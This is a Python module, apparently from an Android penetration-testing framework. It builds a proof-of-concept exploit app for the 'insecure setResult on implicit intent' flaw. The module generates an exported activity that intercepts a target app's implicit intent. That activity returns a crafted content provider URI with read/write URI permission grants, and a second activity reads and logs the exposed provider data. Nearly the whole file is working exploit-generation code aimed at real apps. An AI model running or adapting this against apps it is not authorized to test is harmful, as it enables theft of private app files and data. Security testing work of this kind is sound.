from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.options import option_state
from state.opt_bool import OptBool
from state.opt_enum import OptEnum
from state.opt_list import OptList
from state.opt_str import OptStr


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "insecure_set_result_implicit"
        self._template = Template()


    def register_options(self):
        option_state.add_options([
            OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink", False]),
            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
            OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            OptStr("TARGET_CLASS", [True, "Target class name"]),
            OptStr("INTENT_ACTION", [True, "Action name to intercept"]),
            OptList("PUT_EXTRA", [False, "Intent extra data"]),
            OptList("INTERCEPT_EXTRA", [False, "Intercept intent extra data"]),
            OptEnum("RESULT_CODE", [True, "Result code returned to the caller", -1, [-1, 0, 1, "RESULT_OK", "RESULT_FIRST_USER", "RESULT_CANCELED"]])
        ])
        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": ["target_class"]
            }
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        via_deeplink = opts['VIA_DEEPLINK']
        deeplink_uri = opts['DEEPLINK_URI']
        provider_type = opts['PROVIDER_TYPE']
        provider_uri = opts['PROVIDER_URI']
        target_package = opts['TARGET_PACKAGE']
        target_class = opts['TARGET_CLASS']
        intent_action = opts['INTENT_ACTION']
        put_extra = opts['PUT_EXTRA']
        intercept_extra = opts['INTERCEPT_EXTRA']
        result_code = opts['RESULT_CODE']

        manifest = [
            self._template.build_manifest_component(
                self.activity_name(self._id, target_package)
            ),
            self._template.build_manifest_component(
                self.intercept_activity_name(self._id, target_package),
                is_exported=True,
                intercept=True, 
                action=intent_action
            )
        ]

        exploit_activity = self._template.build_activity(
            name=self.activity_name(self._id, target_package),
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.database.Cursor",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Base64",
                "android.util.Log",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "java.io.BufferedReader",
                "java.io.FileNotFoundException",
                "java.io.IOException",
                "java.io.InputStream",
                "java.io.InputStreamReader",
                "java.nio.charset.StandardCharsets"
            ],
            bind_button=True,
            on_create=[self._template.build_intent(
                set_action="android.intent.action.VIEW" if via_deeplink else None,
                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
                set_classname=[target_package, target_class] if not via_deeplink else [],
                start_activity=False,
                start_for_result=True
            )],
            listener=[
                self._template.build_start_for_result_launcher(
                    result_code,
                    process_result=[
                        self._template.resolve_content(provider_type)
                    ]
                )
            ]
        )

        intercept_activity = self._template.build_activity(
            name=self.intercept_activity_name(self._id, target_package),
            libs=[
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            on_create=[self._template.build_intent(
                set_data=f'"{provider_uri}"',
                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in intercept_extra] if intercept_extra != "" else [],
                set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
                start_activity=False,
                set_result=True,
                result_code=result_code
            )],
            finish=True
        )

        component = [
            {
                "name": f"{self.activity_name(self._id, target_package)}.java",
                "content": exploit_activity
            },
            {
                "name": f"{self.intercept_activity_name(self._id, target_package)}.java",
                "content": intercept_activity
            }
        ]

        app = {
            "manifest": manifest,
            "layout": self._template.button_layout(self._id, target_package),
            "bind_button": self._template.bind_button(self._id, target_package),
            "component": component
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Module failed to execute, terminating module..\n")
            return

        self.check_logcat()